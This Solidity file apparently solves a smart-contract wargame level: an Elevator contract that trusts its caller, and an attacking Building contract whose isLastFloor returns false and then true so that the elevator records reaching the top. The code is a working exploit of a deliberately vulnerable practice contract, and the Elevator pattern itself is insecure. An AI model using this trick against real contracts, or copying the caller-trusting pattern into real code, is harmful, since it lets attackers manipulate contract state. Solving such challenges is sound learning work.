// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// interface Building {
//   function isLastFloor(uint) external returns (bool);
// }

contract Building   // Hack 
{
    function attack (Elevator i) public 
    {
        i.goTo(123);
        require(i.top() == true,"mc bc");
    }
    uint public a;
    function isLastFloor(uint _floor) external returns (bool)
    {
        if(a == 0)
        {
            a++;
            return false;
        }
        return true;
    }
}



contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}